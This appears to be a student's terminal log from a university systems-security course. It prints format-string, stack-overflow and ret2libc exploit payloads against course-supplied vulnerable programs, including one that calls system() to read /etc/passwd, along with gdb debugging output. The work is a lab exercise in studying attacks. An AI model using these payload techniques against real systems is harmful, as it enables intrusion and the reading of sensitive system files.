Last login: Thu Oct 25 18:59:20 on ttys000
Lunarantic:team9 Lunarantic$ cd ../..
Lunarantic:576 Lunarantic$ ls
2018-10-24T2135_Grades-Systems_Security.csv	hw2-more_attacks-old.tar.gz
assign1						hw2-more_attacks.tar.gz
assign2.tar.gz					hw2-ret2libc
gdb-sleep					hw2-ret2libc-mod.tar.gz
hw1-stack_smashing				hw2-ret2libc.tar.gz
hw1-stack_smashing.pdf				hw2.tar.gz
hw1-stack_smashing.tar.gz			lab4
hw2						stack_and_leak
hw2-more_attacks				stack_and_leak.tar.gz
hw2-more_attacks-new.tar.gz			testtar
Lunarantic:576 Lunarantic$ cd hw2-ret2libc
Lunarantic:hw2-ret2libc Lunarantic$ ls
Makefile		mal3			vuln_prog2.bin		vuln_prog4.bin
hw2-ss-fmt-r2l.tar.gz	mal4			vuln_prog2.c		vuln_prog4.c
mal			payloads.txt		vuln_prog3.bin
mal1			vuln_prog1.bin		vuln_prog3.c
mal2			vuln_prog1.c		vuln_prog4
Lunarantic:hw2-ret2libc Lunarantic$ vim payloads.txt 
Lunarantic:hw2-ret2libc Lunarantic$ vim payloads.txt 
Lunarantic:hw2-ret2libc Lunarantic$ vim payloads.txt 
Lunarantic:hw2-ret2libc Lunarantic$ ls -l
total 224
-rw-------  1 Lunarantic  staff   568 Oct 12 23:32 Makefile
-rw-------  1 Lunarantic  staff  9030 Oct  8 15:59 hw2-ss-fmt-r2l.tar.gz
-rw-r--r--  1 Lunarantic  staff   297 Oct 12 17:55 mal
-rw-r--r--  1 Lunarantic  staff   297 Oct 12 18:05 mal1
-rw-r--r--  1 Lunarantic  staff   169 Oct 13 00:22 mal2
-rw-r--r--  1 Lunarantic  staff   281 Oct 13 00:49 mal3
-rw-r--r--  1 Lunarantic  staff   281 Oct 13 01:16 mal4
-rw-r--r--  1 Lunarantic  staff   941 Oct 13 01:18 payloads.txt
-rwx------  1 Lunarantic  staff  9096 Oct  8 15:58 vuln_prog1.bin
-rw-------  1 Lunarantic  staff   861 Oct 12 16:22 vuln_prog1.c
-rwx------  1 Lunarantic  staff  9080 Oct  8 15:58 vuln_prog2.bin
-rw-------  1 Lunarantic  staff   813 Oct 13 00:21 vuln_prog2.c
-rwx------  1 Lunarantic  staff  7588 Oct  8 15:58 vuln_prog3.bin
-rw-------  1 Lunarantic  staff   345 Oct 13 01:16 vuln_prog3.c
-rwxr-xr-x  1 Lunarantic  staff  8864 Oct  8 19:52 vuln_prog4
-rwx------  1 Lunarantic  staff  8904 Oct  8 15:58 vuln_prog4.bin
-rw-------  1 Lunarantic  staff   449 Oct  8 14:59 vuln_prog4.c
Lunarantic:hw2-ret2libc Lunarantic$ cd ..
Lunarantic:576 Lunarantic$ ls
2018-10-24T2135_Grades-Systems_Security.csv	hw2-more_attacks-old.tar.gz
assign1						hw2-more_attacks.tar.gz
assign2.tar.gz					hw2-ret2libc
gdb-sleep					hw2-ret2libc-mod.tar.gz
hw1-stack_smashing				hw2-ret2libc.tar.gz
hw1-stack_smashing.pdf				hw2.tar.gz
hw1-stack_smashing.tar.gz			lab4
hw2						stack_and_leak
hw2-more_attacks				stack_and_leak.tar.gz
hw2-more_attacks-new.tar.gz			testtar
Lunarantic:576 Lunarantic$ cd hw2-more_attacks
Lunarantic:hw2-more_attacks Lunarantic$ ls
vuln_prog1.bin	vuln_prog2.bin	vuln_prog3.bin	vuln_prog4.bin
vuln_prog1.c	vuln_prog2.c	vuln_prog3.c	vuln_prog4.c
Lunarantic:hw2-more_attacks Lunarantic$ ls -l
total 120
-rwxr-xr-x  1 Lunarantic  staff  9160 Oct 12 23:32 vuln_prog1.bin
-rw-------@ 1 Lunarantic  staff   861 Oct 16 13:40 vuln_prog1.c
-rwxr-xr-x  1 Lunarantic  staff  9088 Oct 13 00:24 vuln_prog2.bin
-rw-------@ 1 Lunarantic  staff   813 Oct 16 13:40 vuln_prog2.c
-rwxr-xr-x  1 Lunarantic  staff  7492 Oct 13 01:16 vuln_prog3.bin
-rw-------@ 1 Lunarantic  staff   345 Oct 16 13:40 vuln_prog3.c
-rwx------@ 1 Lunarantic  staff  8904 Oct 16 13:40 vuln_prog4.bin
-rw-------@ 1 Lunarantic  staff   449 Oct 16 13:40 vuln_prog4.c
Lunarantic:hw2-more_attacks Lunarantic$ md5 vuln_prog3.bin 
MD5 (vuln_prog3.bin) = 6a67b9cc0a73850c16b3b2a8f1e75f58
Lunarantic:hw2-more_attacks Lunarantic$ ssh ryadav3@nemo.srcit.stevens-tech.edu
ryadav3@nemo.srcit.stevens-tech.edu's password: 
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-134-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

25 packages can be updated.
0 updates are security updates.

New release '18.04.1 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


*** System restart required ***
Last login: Thu Oct 25 18:30:54 2018 from 155.246.170.155
ryadav3@nemo:~$ cd 576/assigns/hw2/hw2-ret2libc/
ryadav3@nemo:~/576/assigns/hw2/hw2-ret2libc$ ls
hw2-ss-fmt-r2l.tar.gz  mal1  mal4          vuln_prog1.bin  vuln_prog2.bin  vuln_prog3.bin  vuln_prog4.bin
Makefile               mal2  payloads.txt  vuln_prog1.c    vuln_prog2.c    vuln_prog3.c    vuln_prog4.c
mal                    mal3  vuln_prog1    vuln_prog2      vuln_prog3      vuln_prog4
ryadav3@nemo:~/576/assigns/hw2/hw2-ret2libc$ python -c "print ''" > smal
ryadav3@nemo:~/576/assigns/hw2/hw2-ret2libc$ 
ryadav3@nemo:~/576/assigns/hw2/hw2-ret2libc$ 
ryadav3@nemo:~/576/assigns/hw2/hw2-ret2libc$ uname -a
Linux nemo 4.4.0-134-generic #160-Ubuntu SMP Wed Aug 15 14:58:00 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
ryadav3@nemo:~/576/assigns/hw2/hw2-ret2libc$ kill -9 $$
Connection to nemo.srcit.stevens-tech.edu closed.
Lunarantic:hw2-more_attacks Lunarantic$ ls
vuln_prog1.bin	vuln_prog2.bin	vuln_prog3.bin	vuln_prog4.bin
vuln_prog1.c	vuln_prog2.c	vuln_prog3.c	vuln_prog4.c
Lunarantic:hw2-more_attacks Lunarantic$ ls -la
total 120
drwx------@ 10 Lunarantic  staff   320 Oct 19 12:01 .
drwxr-xr-x  23 Lunarantic  staff   736 Oct 24 21:34 ..
-rwxr-xr-x   1 Lunarantic  staff  9160 Oct 12 23:32 vuln_prog1.bin
-rw-------@  1 Lunarantic  staff   861 Oct 16 13:40 vuln_prog1.c
-rwxr-xr-x   1 Lunarantic  staff  9088 Oct 13 00:24 vuln_prog2.bin
-rw-------@  1 Lunarantic  staff   813 Oct 16 13:40 vuln_prog2.c
-rwxr-xr-x   1 Lunarantic  staff  7492 Oct 13 01:16 vuln_prog3.bin
-rw-------@  1 Lunarantic  staff   345 Oct 16 13:40 vuln_prog3.c
-rwx------@  1 Lunarantic  staff  8904 Oct 16 13:40 vuln_prog4.bin
-rw-------@  1 Lunarantic  staff   449 Oct 16 13:40 vuln_prog4.c
Lunarantic:hw2-more_attacks Lunarantic$ md5 vuln_prog3.bin 
MD5 (vuln_prog3.bin) = 6a67b9cc0a73850c16b3b2a8f1e75f58
Lunarantic:hw2-more_attacks Lunarantic$ ls
vuln_prog1.bin	vuln_prog2.bin	vuln_prog3.bin	vuln_prog4.bin
vuln_prog1.c	vuln_prog2.c	vuln_prog3.c	vuln_prog4.c
Lunarantic:hw2-more_attacks Lunarantic$ cd ..
Lunarantic:576 Lunarantic$ ls
2018-10-24T2135_Grades-Systems_Security.csv	hw2-more_attacks-old.tar.gz
assign1						hw2-more_attacks.tar.gz
assign2.tar.gz					hw2-ret2libc
gdb-sleep					hw2-ret2libc-mod.tar.gz
hw1-stack_smashing				hw2-ret2libc.tar.gz
hw1-stack_smashing.pdf				hw2.tar.gz
hw1-stack_smashing.tar.gz			lab4
hw2						stack_and_leak
hw2-more_attacks				stack_and_leak.tar.gz
hw2-more_attacks-new.tar.gz			testtar
Lunarantic:576 Lunarantic$ cd hw2-ret2libc
Lunarantic:hw2-ret2libc Lunarantic$ ls
Makefile		mal3			vuln_prog2.bin		vuln_prog4.bin
hw2-ss-fmt-r2l.tar.gz	mal4			vuln_prog2.c		vuln_prog4.c
mal			payloads.txt		vuln_prog3.bin
mal1			vuln_prog1.bin		vuln_prog3.c
mal2			vuln_prog1.c		vuln_prog4
Lunarantic:hw2-ret2libc Lunarantic$ cat payloads.txt 
Task1:

python -c "import struct; print 'A'*26 + '%68$n' + 'B'*249 + '\x00'*8 + struct.pack('Q', 0x6010ac)" > mal1
# 0x6010ac is address of global variable

./vuln_prog1 123 < mal1

------------------------------------

Task2:

python -c "import struct; print 'AAAA'*4*8 + struct.pack('Q', 0x2279f) + 'B'*24 + struct.pack('Q', 0x5de)" > mal2

./vuln_prog2 123456 < mal2

------------------------------------

Task3: 

python -c "import struct; print 'cat /etc/passwd\0' + 'A'*252 + struct.pack('I', 0xf7e46da0) + struct.pack('I', 0xf7e3a9d0) + struct.pack('I', 0xffffd350)" > mal3
# 0xf7e46da0 system() address
# 0xf7e3a9d0 exit() address
# 0xffffd350 stack address for buffer while in gdb
gdb ./vuln_prog4
run < mal3

python -c "import struct; print 'cat /etc/passwd\0' + 'A'*252 + struct.pack('I', 0xf7e46da0) + struct.pack('I', 0xf7e3a9d0) + struct.pack('I', 0xffffd390)" > mal4
# 0xffffd390 stack address for buffer
./vuln_prog4 < mal4

Lunarantic:hw2-ret2libc Lunarantic$ ssh ryadav3@nemo.srcit.stevens-tech.edu
ryadav3@nemo.srcit.stevens-tech.edu's password: 
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-134-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

32 packages can be updated.
0 updates are security updates.

New release '18.04.1 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


*** System restart required ***
Last login: Thu Oct 25 20:22:25 2018 from 155.246.170.155
ryadav3@nemo:~$ cd 576/assigns/hw
hw1-stack_smashing/ hw2/                
ryadav3@nemo:~$ cd 576/assigns/hw
hw1-stack_smashing/ hw2/                
ryadav3@nemo:~$ cd 576/assigns/hw2/hw2-ret2libc/
ryadav3@nemo:~/576/assigns/hw2/hw2-ret2libc$ l
l: command not found
ryadav3@nemo:~/576/assigns/hw2/hw2-ret2libc$ ls
hw2-ss-fmt-r2l.tar.gz  mal1  mal4          vuln_prog1      vuln_prog2      vuln_prog3      vuln_prog4
Makefile               mal2  payloads.txt  vuln_prog1.bin  vuln_prog2.bin  vuln_prog3.bin  vuln_prog4.bin
mal                    mal3  smal          vuln_prog1.c    vuln_prog2.c    vuln_prog3.c    vuln_prog4.c
ryadav3@nemo:~/576/assigns/hw2/hw2-ret2libc$ setarch x86_64 -R ./vuln_prog3 < mal4
Connect to Mars
...
...
...
Connected

Input:

Transmitting::cat /etc/passwd
...
sent
...
Connection terminating
...
sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: not found
ryadav3@nemo:~/576/assigns/hw2/hw2-ret2libc$ setarch x86_64 -R ./vuln_prog3 < mal3
Connect to Mars
...
...
...
Connected

Input:

Transmitting::cat /etc/passwd
...
sent
...
Connection terminating
...
sh: 1: Syntax error: EOF in backquote substitution
ryadav3@nemo:~/576/assigns/hw2/hw2-ret2libc$ 
ryadav3@nemo:~/576/assigns/hw2/hw2-ret2libc$ 
ryadav3@nemo:~/576/assigns/hw2/hw2-ret2libc$ cat payloads.txt 
Task1:

python -c "import struct; print 'A'*26 + '%68$n' + 'B'*249 + '\x00'*8 + struct.pack('Q', 0x6010ac)" > mal1
# 0x6010ac is address of global variable

./vuln_prog1 123 < mal1

------------------------------------

Task2:

python -c "import struct; print 'AAAA'*4*8 + struct.pack('Q', 0x2279f) + 'B'*24 + struct.pack('Q', 0x5de)" > mal2

./vuln_prog2 123456 < mal2

------------------------------------

Task3: 

python -c "import struct; print 'cat /etc/passwd\0' + 'A'*252 + struct.pack('I', 0xf7e46da0) + struct.pack('I', 0xf7e3a9d0) + struct.pack('I', 0xffffd350)" > mal3
# 0xf7e46da0 system() address
# 0xf7e3a9d0 exit() address
# 0xffffd350 stack address for buffer while in gdb
gdb ./vuln_prog4
run < mal3

python -c "import struct; print 'cat /etc/passwd\0' + 'A'*252 + struct.pack('I', 0xf7e46da0) + struct.pack('I', 0xf7e3a9d0) + struct.pack('I', 0xffffd390)" > mal4
# 0xffffd390 stack address for buffer
./vuln_prog4 < mal4

ryadav3@nemo:~/576/assigns/hw2/hw2-ret2libc$ gdb ./vuln_prog3
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./vuln_prog3...(no debugging symbols found)...done.
(gdb) r < mal3
Starting program: /home/ryadav3/576/assigns/hw2/hw2-ret2libc/vuln_prog3 < mal3
Connect to Mars
...
...
...
Connected

Input:

Transmitting::cat /etc/passwd
...
sent
...
Connection terminating
...
sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: not found
[Inferior 1 (process 1720) exited with code 012]
(gdb) b push_to_talk 
Breakpoint 1 at 0x80484a4
(gdb) r < mal3
Starting program: /home/ryadav3/576/assigns/hw2/hw2-ret2libc/vuln_prog3 < mal3

Breakpoint 1, 0x080484a4 in push_to_talk ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e46da0 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e3a9d0 <exit>
(gdb) 
$3 = {<text variable, no debug info>} 0xf7e3a9d0 <exit>
(gdb) 
$4 = {<text variable, no debug info>} 0xf7e3a9d0 <exit>
(gdb) disas
Dump of assembler code for function push_to_talk:
   0x0804849b <+0>:	push   %ebp
   0x0804849c <+1>:	mov    %esp,%ebp
   0x0804849e <+3>:	sub    $0x108,%esp
=> 0x080484a4 <+9>:	sub    $0xc,%esp
   0x080484a7 <+12>:	push   $0x8048590
   0x080484ac <+17>:	call   0x8048370 <puts@plt>
   0x080484b1 <+22>:	add    $0x10,%esp
   0x080484b4 <+25>:	mov    0x804a040,%eax
   0x080484b9 <+30>:	sub    $0x4,%esp
   0x080484bc <+33>:	push   %eax
   0x080484bd <+34>:	push   $0x200
   0x080484c2 <+39>:	lea    -0x108(%ebp),%eax
   0x080484c8 <+45>:	push   %eax
   0x080484c9 <+46>:	call   0x8048360 <fgets@plt>
   0x080484ce <+51>:	add    $0x10,%esp
   0x080484d1 <+54>:	sub    $0x8,%esp
   0x080484d4 <+57>:	lea    -0x108(%ebp),%eax
   0x080484da <+63>:	push   %eax
   0x080484db <+64>:	push   $0x80485c0
   0x080484e0 <+69>:	call   0x8048350 <printf@plt>
   0x080484e5 <+74>:	add    $0x10,%esp
   0x080484e8 <+77>:	nop
   0x080484e9 <+78>:	leave  
   0x080484ea <+79>:	ret    
End of assembler dump.
(gdb) b push_to_talk+51
Function "push_to_talk+51" not defined.
Make breakpoint pending on future shared library load? (y or [n]) n
(gdb) b push_to_talk<+51>
Function "push_to_talk<+51>" not defined.
Make breakpoint pending on future shared library load? (y or [n]) n
(gdb) b push_to_talk:51
Note: breakpoint 1 also set at pc 0x80484a4.
Breakpoint 2 at 0x80484a4
(gdb) delete breakpoints 
Delete all breakpoints? (y or n) y
(gdb) b push_to_talk:+51
Breakpoint 3 at 0x80484a4
(gdb) delete breakpoints 3
(gdb) disas
Dump of assembler code for function push_to_talk:
   0x0804849b <+0>:	push   %ebp
   0x0804849c <+1>:	mov    %esp,%ebp
   0x0804849e <+3>:	sub    $0x108,%esp
=> 0x080484a4 <+9>:	sub    $0xc,%esp
   0x080484a7 <+12>:	push   $0x8048590
   0x080484ac <+17>:	call   0x8048370 <puts@plt>
   0x080484b1 <+22>:	add    $0x10,%esp
   0x080484b4 <+25>:	mov    0x804a040,%eax
   0x080484b9 <+30>:	sub    $0x4,%esp
   0x080484bc <+33>:	push   %eax
   0x080484bd <+34>:	push   $0x200
   0x080484c2 <+39>:	lea    -0x108(%ebp),%eax
   0x080484c8 <+45>:	push   %eax
   0x080484c9 <+46>:	call   0x8048360 <fgets@plt>
   0x080484ce <+51>:	add    $0x10,%esp
   0x080484d1 <+54>:	sub    $0x8,%esp
   0x080484d4 <+57>:	lea    -0x108(%ebp),%eax
   0x080484da <+63>:	push   %eax
   0x080484db <+64>:	push   $0x80485c0
   0x080484e0 <+69>:	call   0x8048350 <printf@plt>
   0x080484e5 <+74>:	add    $0x10,%esp
   0x080484e8 <+77>:	nop
   0x080484e9 <+78>:	leave  
   0x080484ea <+79>:	ret    
End of assembler dump.
(gdb) b +11
No symbol table is loaded.  Use the "file" command.
(gdb) info file
Symbols from "/home/ryadav3/576/assigns/hw2/hw2-ret2libc/vuln_prog3".
Native process:
	Using the running image of child process 1731.
	While running this, GDB does not access memory from...
Local exec file:
	`/home/ryadav3/576/assigns/hw2/hw2-ret2libc/vuln_prog3', file type elf32-i386.
	Entry point: 0x80483a0
	0x08048154 - 0x08048167 is .interp
	0x08048168 - 0x08048188 is .note.ABI-tag
	0x08048188 - 0x080481ac is .note.gnu.build-id
	0x080481ac - 0x080481d0 is .gnu.hash
	0x080481d0 - 0x08048250 is .dynsym
	0x08048250 - 0x080482ad is .dynstr
	0x080482ae - 0x080482be is .gnu.version
	0x080482c0 - 0x080482e0 is .gnu.version_r
	0x080482e0 - 0x080482f0 is .rel.dyn
	0x080482f0 - 0x08048310 is .rel.plt
	0x08048310 - 0x08048333 is .init
	0x08048340 - 0x08048390 is .plt
	0x08048390 - 0x08048398 is .plt.got
	0x080483a0 - 0x08048572 is .text
	0x08048574 - 0x08048588 is .fini
	0x08048588 - 0x080485fb is .rodata
	0x080485fc - 0x08048630 is .eh_frame_hdr
	0x08048630 - 0x0804871c is .eh_frame
	0x08049f08 - 0x08049f0c is .init_array
	0x08049f0c - 0x08049f10 is .fini_array
	0x08049f10 - 0x08049f14 is .jcr
	0x08049f14 - 0x08049ffc is .dynamic
	0x08049ffc - 0x0804a000 is .got
	0x0804a000 - 0x0804a01c is .got.plt
	0x0804a01c - 0x0804a024 is .data
	0x0804a040 - 0x0804a048 is .bss
	0xf7fd9114 - 0xf7fd9138 is .note.gnu.build-id in /lib/ld-linux.so.2
	0xf7fd9138 - 0xf7fd91fc is .hash in /lib/ld-linux.so.2
---Type <return> to continue, or q <return> to quit---
	0xf7fd91fc - 0xf7fd92e4 is .gnu.hash in /lib/ld-linux.so.2
	0xf7fd92e4 - 0xf7fd94c4 is .dynsym in /lib/ld-linux.so.2
	0xf7fd94c4 - 0xf7fd966d is .dynstr in /lib/ld-linux.so.2
	0xf7fd966e - 0xf7fd96aa is .gnu.version in /lib/ld-linux.so.2
	0xf7fd96ac - 0xf7fd9774 is .gnu.version_d in /lib/ld-linux.so.2
	0xf7fd9774 - 0xf7fd97dc is .rel.dyn in /lib/ld-linux.so.2
	0xf7fd97dc - 0xf7fd97fc is .rel.plt in /lib/ld-linux.so.2
	0xf7fd9800 - 0xf7fd9850 is .plt in /lib/ld-linux.so.2
	0xf7fd9850 - 0xf7fd9858 is .plt.got in /lib/ld-linux.so.2
	0xf7fd9860 - 0xf7ff277d is .text in /lib/ld-linux.so.2
	0xf7ff2780 - 0xf7ff6a20 is .rodata in /lib/ld-linux.so.2
	0xf7ff6a20 - 0xf7ff6a21 is .stapsdt.base in /lib/ld-linux.so.2
	0xf7ff6a24 - 0xf7ff70e0 is .eh_frame_hdr in /lib/ld-linux.so.2
	0xf7ff70e0 - 0xf7ffb044 is .eh_frame in /lib/ld-linux.so.2
	0xf7ffcc80 - 0xf7ffcf3c is .data.rel.ro in /lib/ld-linux.so.2
	0xf7ffcf3c - 0xf7ffcff4 is .dynamic in /lib/ld-linux.so.2
	0xf7ffcff4 - 0xf7ffcffc is .got in /lib/ld-linux.so.2
	0xf7ffd000 - 0xf7ffd01c is .got.plt in /lib/ld-linux.so.2
	0xf7ffd020 - 0xf7ffd858 is .data in /lib/ld-linux.so.2
	0xf7ffd858 - 0xf7ffd918 is .bss in /lib/ld-linux.so.2
	0xf7fd80b4 - 0xf7fd80ec is .hash in system-supplied DSO at 0xf7fd8000
	0xf7fd80ec - 0xf7fd8130 is .gnu.hash in system-supplied DSO at 0xf7fd8000
	0xf7fd8130 - 0xf7fd81c0 is .dynsym in system-supplied DSO at 0xf7fd8000
	0xf7fd81c0 - 0xf7fd8255 is .dynstr in system-supplied DSO at 0xf7fd8000
	0xf7fd8256 - 0xf7fd8268 is .gnu.version in system-supplied DSO at 0xf7fd8000
	0xf7fd8268 - 0xf7fd82bc is .gnu.version_d in system-supplied DSO at 0xf7fd8000
	0xf7fd82bc - 0xf7fd8344 is .dynamic in system-supplied DSO at 0xf7fd8000
	0xf7fd8344 - 0xf7fd8558 is .rodata in system-supplied DSO at 0xf7fd8000
	0xf7fd8558 - 0xf7fd85b8 is .note in system-supplied DSO at 0xf7fd8000
	0xf7fd85b8 - 0xf7fd85dc is .eh_frame_hdr in system-supplied DSO at 0xf7fd8000
	0xf7fd85dc - 0xf7fd86e8 is .eh_frame in system-supplied DSO at 0xf7fd8000
---Type <return> to continue, or q <return> to quit---
	0xf7fd86f0 - 0xf7fd8bed is .text in system-supplied DSO at 0xf7fd8000
	0xf7fd8bed - 0xf7fd8c21 is .altinstructions in system-supplied DSO at 0xf7fd8000
	0xf7fd8c21 - 0xf7fd8c2f is .altinstr_replacement in system-supplied DSO at 0xf7fd8000
	0xf7e0c174 - 0xf7e0c198 is .note.gnu.build-id in /lib/i386-linux-gnu/libc.so.6
	0xf7e0c198 - 0xf7e0c1b8 is .note.ABI-tag in /lib/i386-linux-gnu/libc.so.6
	0xf7e0c1b8 - 0xf7e0ff28 is .gnu.hash in /lib/i386-linux-gnu/libc.so.6
	0xf7e0ff28 - 0xf7e19618 is .dynsym in /lib/i386-linux-gnu/libc.so.6
	0xf7e19618 - 0xf7e1f45c is .dynstr in /lib/i386-linux-gnu/libc.so.6
	0xf7e1f45c - 0xf7e2073a is .gnu.version in /lib/i386-linux-gnu/libc.so.6
	0xf7e2073c - 0xf7e20c10 is .gnu.version_d in /lib/i386-linux-gnu/libc.so.6
	0xf7e20c10 - 0xf7e20c50 is .gnu.version_r in /lib/i386-linux-gnu/libc.so.6
	0xf7e20c50 - 0xf7e23650 is .rel.dyn in /lib/i386-linux-gnu/libc.so.6
	0xf7e23650 - 0xf7e23698 is .rel.plt in /lib/i386-linux-gnu/libc.so.6
	0xf7e236a0 - 0xf7e23740 is .plt in /lib/i386-linux-gnu/libc.so.6
	0xf7e23740 - 0xf7e23750 is .plt.got in /lib/i386-linux-gnu/libc.so.6
	0xf7e23750 - 0xf7f4f21d is .text in /lib/i386-linux-gnu/libc.so.6
	0xf7f4f220 - 0xf7f5024e is __libc_freeres_fn in /lib/i386-linux-gnu/libc.so.6
	0xf7f50250 - 0xf7f50489 is __libc_thread_freeres_fn in /lib/i386-linux-gnu/libc.so.6
	0xf7f504a0 - 0xf7f71074 is .rodata in /lib/i386-linux-gnu/libc.so.6
	0xf7f71074 - 0xf7f71075 is .stapsdt.base in /lib/i386-linux-gnu/libc.so.6
	0xf7f71078 - 0xf7f7108b is .interp in /lib/i386-linux-gnu/libc.so.6
	0xf7f7108c - 0xf7f77228 is .eh_frame_hdr in /lib/i386-linux-gnu/libc.so.6
	0xf7f77228 - 0xf7fb7724 is .eh_frame in /lib/i386-linux-gnu/libc.so.6
	0xf7fb7724 - 0xf7fb7b99 is .gcc_except_table in /lib/i386-linux-gnu/libc.so.6
	0xf7fb7b9c - 0xf7fbb15c is .hash in /lib/i386-linux-gnu/libc.so.6
	0xf7fbc23c - 0xf7fbc244 is .tdata in /lib/i386-linux-gnu/libc.so.6
	0xf7fbc244 - 0xf7fbc284 is .tbss in /lib/i386-linux-gnu/libc.so.6
	0xf7fbc244 - 0xf7fbc250 is .init_array in /lib/i386-linux-gnu/libc.so.6
	0xf7fbc250 - 0xf7fbc2cc is __libc_subfreeres in /lib/i386-linux-gnu/libc.so.6
	0xf7fbc2cc - 0xf7fbc2d0 is __libc_atexit in /lib/i386-linux-gnu/libc.so.6
	0xf7fbc2d0 - 0xf7fbc2e0 is __libc_thread_subfreeres in /lib/i386-linux-gnu/libc.so.6
---Type <return> to continue, or q <return> to quit---
	0xf7fbc2e0 - 0xf7fbddb0 is .data.rel.ro in /lib/i386-linux-gnu/libc.so.6
	0xf7fbddb0 - 0xf7fbdea0 is .dynamic in /lib/i386-linux-gnu/libc.so.6
	0xf7fbdea0 - 0xf7fbdff0 is .got in /lib/i386-linux-gnu/libc.so.6
	0xf7fbe000 - 0xf7fbe030 is .got.plt in /lib/i386-linux-gnu/libc.so.6
	0xf7fbe040 - 0xf7fbeed4 is .data in /lib/i386-linux-gnu/libc.so.6
	0xf7fbeee0 - 0xf7fc1a1c is .bss in /lib/i386-linux-gnu/libc.so.6
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) disas
Dump of assembler code for function push_to_talk:
   0x0804849b <+0>:	push   %ebp
   0x0804849c <+1>:	mov    %esp,%ebp
   0x0804849e <+3>:	sub    $0x108,%esp
=> 0x080484a4 <+9>:	sub    $0xc,%esp
   0x080484a7 <+12>:	push   $0x8048590
   0x080484ac <+17>:	call   0x8048370 <puts@plt>
   0x080484b1 <+22>:	add    $0x10,%esp
   0x080484b4 <+25>:	mov    0x804a040,%eax
   0x080484b9 <+30>:	sub    $0x4,%esp
   0x080484bc <+33>:	push   %eax
   0x080484bd <+34>:	push   $0x200
   0x080484c2 <+39>:	lea    -0x108(%ebp),%eax
   0x080484c8 <+45>:	push   %eax
   0x080484c9 <+46>:	call   0x8048360 <fgets@plt>
   0x080484ce <+51>:	add    $0x10,%esp
   0x080484d1 <+54>:	sub    $0x8,%esp
   0x080484d4 <+57>:	lea    -0x108(%ebp),%eax
   0x080484da <+63>:	push   %eax
   0x080484db <+64>:	push   $0x80485c0
   0x080484e0 <+69>:	call   0x8048350 <printf@plt>
   0x080484e5 <+74>:	add    $0x10,%esp
   0x080484e8 <+77>:	nop
   0x080484e9 <+78>:	leave  
   0x080484ea <+79>:	ret    
End of assembler dump.
(gdb) b *0x080484ce
Breakpoint 4 at 0x80484ce
(gdb) c
Continuing.
Connect to Mars
...
...
...
Connected

Input:

Breakpoint 4, 0x080484ce in push_to_talk ()
(gdb) bt
#0  0x080484ce in push_to_talk ()
#1  0xf7e46da0 in ?? () from /lib/i386-linux-gnu/libc.so.6
Backtrace stopped: previous frame inner to this frame (corrupt stack?)
(gdb) ls
Undefined command: "ls".  Try "help".
(gdb) disas
Dump of assembler code for function push_to_talk:
   0x0804849b <+0>:	push   %ebp
   0x0804849c <+1>:	mov    %esp,%ebp
   0x0804849e <+3>:	sub    $0x108,%esp
   0x080484a4 <+9>:	sub    $0xc,%esp
   0x080484a7 <+12>:	push   $0x8048590
   0x080484ac <+17>:	call   0x8048370 <puts@plt>
   0x080484b1 <+22>:	add    $0x10,%esp
   0x080484b4 <+25>:	mov    0x804a040,%eax
   0x080484b9 <+30>:	sub    $0x4,%esp
   0x080484bc <+33>:	push   %eax
   0x080484bd <+34>:	push   $0x200
   0x080484c2 <+39>:	lea    -0x108(%ebp),%eax
   0x080484c8 <+45>:	push   %eax
   0x080484c9 <+46>:	call   0x8048360 <fgets@plt>
=> 0x080484ce <+51>:	add    $0x10,%esp
   0x080484d1 <+54>:	sub    $0x8,%esp
   0x080484d4 <+57>:	lea    -0x108(%ebp),%eax
   0x080484da <+63>:	push   %eax
   0x080484db <+64>:	push   $0x80485c0
   0x080484e0 <+69>:	call   0x8048350 <printf@plt>
   0x080484e5 <+74>:	add    $0x10,%esp
   0x080484e8 <+77>:	nop
   0x080484e9 <+78>:	leave  
   0x080484ea <+79>:	ret    
End of assembler dump.
(gdb) x/100x $esp
0xffffd320:	0xffffd330	0x00000200	0xf7fbe5a0	0x00000000
0xffffd330:	0x20746163	0x6374652f	0x7361702f	0x00647773
0xffffd340:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd350:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd360:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd370:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd380:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd390:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd3a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd3b0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd3c0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd3d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd3e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd3f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd400:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd410:	0x41414141	0x41414141	0x41414141	0x41414141
